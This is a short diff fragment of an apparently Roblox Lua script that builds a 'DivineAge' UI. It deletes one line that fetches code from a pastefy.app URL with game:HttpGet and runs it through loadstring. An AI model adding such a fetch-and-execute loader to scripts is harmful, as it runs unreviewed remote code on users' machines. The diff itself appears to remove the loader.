@@ -87,4 +87,3 @@ local function createDivineAgeUI()
 end
 
 createDivineAgeUI()
-loadstring(game:HttpGet("https://pastefy.app/ukVzwix5/raw"))()
